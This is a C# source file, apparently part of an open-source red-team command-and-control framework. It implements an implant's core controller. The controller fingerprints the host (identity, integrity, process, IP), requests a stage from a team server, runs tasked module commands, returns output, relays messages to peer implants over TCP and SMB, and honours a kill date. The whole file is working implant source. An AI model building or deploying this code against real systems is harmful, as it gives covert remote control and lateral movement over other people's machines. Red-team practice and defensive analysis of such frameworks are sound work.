using Agent.Interfaces;
using Agent.Models;
using Agent.Modules;

using Common;
using Common.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Agent.Controllers
{
    public class AgentController
    {
        private ConfigController Config { get; set; }
        public CryptoController Crypto { get; private set; }
        private ICommModule CommModule { get; set; }
        public AgentStatus AgentStatus { get; set; }
        public List<string> IdempotencyKeys { get; set; } = new List<string>();
        public List<AgentModule> AgentModules { get; private set; } = new List<AgentModule>();
        public List<TcpClientModule> TcpClients { get; set; } = new List<TcpClientModule>();
        public List<SmbClientModule> SmbClients { get; set; } = new List<SmbClientModule>();

        public delegate void OnAgentCommand(byte[] data);

        public AgentController(ConfigController config, CryptoController crypto, ICommModule commModule)
        {
            AgentStatus = AgentStatus.Starting;
            Config = config;
            Crypto = crypto;
            CommModule = commModule;
        }

        public void Init()
        {
            var metadata = new AgentMetadata
            {
                AgentID = Common.Helpers.GeneratePseudoRandomString(8),
                Hostname = Helpers.GetHostname,
                IPAddress = Helpers.GetIpAddress,
                Integrity = Helpers.GetIntegrity,
                Identity = Helpers.GetIdentity,
                ProcessName = Helpers.GetProcessName,
                ProcessID = Helpers.GetProcessId,
                Arch = Helpers.GetArch,
                CLR = Helpers.GetCLRVersion
            };

            Config.SetOption(ConfigSetting.Metadata, metadata);
        }

        public void Start()
        {
            AgentStatus = AgentStatus.Running;

            CommModule.Start();

            // ask for stage one
            CommModule.SendData(new AgentMessage { IdempotencyKey = Guid.NewGuid().ToString(), Metadata = new AgentMetadata(), Data = new C2Data { Module = "Core", Command = "StageRequest" } });

            while (AgentStatus == AgentStatus.Running)
            {
                CheckKillConditions();

                if (CommModule.RecvData(out AgentMessage incoming))
                {
                    if (incoming != null)
                    {
                        HandleC2Data(incoming);
                    }
                }

                foreach (var tcpClient in TcpClients)
                {
                    if (tcpClient.ModuleStatus == ModuleStatus.Running && tcpClient.RecvData(out AgentMessage outgoing))
                    {
                        CommModule.SendData(outgoing);
                    }
                }

                foreach (var smbClient in SmbClients)
                {
                    if (smbClient.ModuleStatus == ModuleStatus.Running && smbClient.RecvData(out AgentMessage outgoing))
                    {
                        CommModule.SendData(outgoing);
                    }
                }
            }
        }

        public void Stop()
        {
            AgentStatus = AgentStatus.Stopped;
        }

        public void RegisterAgentModule(IAgentModule module)
        {
            var info = module.GetModuleInfo();

            AgentModules.Add(info);
            module.Init(this, Config);

            if (info.NotifyTeamServer)
            {
                SendData(new AgentMessage
                {
                    IdempotencyKey = Guid.NewGuid().ToString(),
                    Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                    Data = new C2Data { Module = "Core", Command = "RegisterAgentModule", Data = Serialisation.SerialiseData(info) }
                });
            }
        }

        public void SendOutput(string output)
        {
            SendData(new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                Data = new C2Data { Module = "Core", Command = "AgentOutput", Data = Encoding.UTF8.GetBytes(output) }
            });
        }

        public void SendModuleData(string module, string command, byte[] data)
        {
            var agentId = (Config.GetOption(ConfigSetting.Metadata) as AgentMetadata).AgentID;

            SendData(new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                Data = new C2Data { AgentID = agentId, Module = module, Command = command, Data = data }
            });
        }

        public void SendError(string error)
        {
            SendData(new AgentMessage
            {
                IdempotencyKey = Guid.NewGuid().ToString(),
                Metadata = Config.GetOption(ConfigSetting.Metadata) as AgentMetadata,
                Data = new C2Data { Module = "Core", Command = "AgentError", Data = Encoding.UTF8.GetBytes(error) }
            });
        }

        private void SendData(AgentMessage message)
        {
            CommModule.SendData(message);
        }

        private void HandleC2Data(AgentMessage message)
        {
            if (IdempotencyKeys.Contains(message.IdempotencyKey))
            {
                SendError("Duplicate IdempotencyKey.");
                return;
            }
            else
            {
                IdempotencyKeys.Add(message.IdempotencyKey);
            }

            if (string.IsNullOrEmpty(message.Data.AgentID) || message.Data.AgentID == (Config.GetOption(ConfigSetting.Metadata) as AgentMetadata).AgentID)    // message is for this agent
            {
                if (!string.IsNullOrEmpty(message.Data.Module))
                {
                    try
                    {
                        var callBack = AgentModules
                        .Where(m => m.Name.Equals(message.Data.Module, StringComparison.OrdinalIgnoreCase))
                        .Select(m => m.Commands).FirstOrDefault()
                        .Where(c => c.Name.Equals(message.Data.Command, StringComparison.OrdinalIgnoreCase))
                        .Select(c => c.CallBack).FirstOrDefault();

                        callBack?.Invoke(message.Data.Data);
                    }
                    catch (Exception e)
                    {
                        SendError(e.Message);
                    }
                }
            }
            else  // message is for another agent
            {
                foreach (var tcpClient in TcpClients) // how lazy is this!!!!
                {
                    tcpClient.SendData(message);
                }

                foreach (var smbClient in SmbClients)  // kill me now.
                {
                    smbClient.SendData(message);
                }
            }
        }

        private void CheckKillConditions()
        {
            if (CommModule.GetStatus() == ModuleStatus.Stopped)
            {
                Stop();
                return;
            }

            if ((DateTime)Config.GetOption(ConfigSetting.KillDate) < DateTime.UtcNow)
            {
                Stop();
                return;
            }
        }
    }
}